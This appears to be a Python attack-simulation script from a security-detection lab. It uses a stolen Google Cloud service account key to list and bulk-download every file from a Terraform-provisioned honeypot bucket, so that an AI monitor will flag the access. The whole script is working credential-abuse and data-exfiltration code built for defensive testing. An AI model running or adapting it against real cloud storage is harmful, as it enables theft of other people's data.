"""
Attack Simulation Script — Data Exfiltration from Honeypot Bucket
=================================================================
Simulates a threat actor using stolen service account credentials
to bulk-download files from a GCS bucket via Python SDK.

User-Agent will appear as:  gcloud-python/... google-cloud-storage/...
This is clearly an automated/programmatic tool → AI should flag CRITICAL.

Usage:
    pip install google-cloud-storage
    python attack_simulation.py
"""

import os
import subprocess
import sys
import tempfile
from google.cloud import storage
from google.oauth2 import service_account

# ── Terraform Output Helper ───────────────────────────────────────
PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))

def get_terraform_output(key: str) -> str:
    """Read a value from `terraform output` in the project root."""
    try:
        result = subprocess.run(
            ["terraform", "output", "-raw", key],
            cwd=PROJECT_ROOT,
            capture_output=True,
            text=True,
            timeout=15,
        )
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip()
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return ""

# ── Configuration ──────────────────────────────────────────────────
KEY_FILE = os.path.join(PROJECT_ROOT, "victim_key.json")
BUCKET_NAME = get_terraform_output("honeypot_bucket_name")
DOWNLOAD_DIR = tempfile.mkdtemp(prefix="exfil_")

if not BUCKET_NAME:
    print("[!] ERROR: Could not read 'honeypot_bucket_name' from terraform output.")
    print("[!] Make sure you have run 'terraform apply' in the project root.")
    sys.exit(1)

def main():
    print(f"[*] Loading stolen credentials from: {KEY_FILE}")
    credentials = service_account.Credentials.from_service_account_file(KEY_FILE)

    print(f"[*] Connecting to GCS as: {credentials.service_account_email}")
    client = storage.Client(credentials=credentials, project=credentials.project_id)

    bucket = client.bucket(BUCKET_NAME)
    blobs = list(bucket.list_blobs())
    print(f"[*] Found {len(blobs)} files in bucket: {BUCKET_NAME}")
    print(f"[*] Downloading to: {DOWNLOAD_DIR}")
    print()

    for i, blob in enumerate(blobs, 1):
        dest = os.path.join(DOWNLOAD_DIR, blob.name.replace("/", "_"))
        blob.download_to_filename(dest)
        size = os.path.getsize(dest)
        print(f"  [{i:3d}/{len(blobs)}] {blob.name} ({size:,} bytes)")

    print()
    print(f"[✓] Exfiltration complete: {len(blobs)} files downloaded")
    print(f"[✓] Data saved to: {DOWNLOAD_DIR}")

if __name__ == "__main__":
    main()
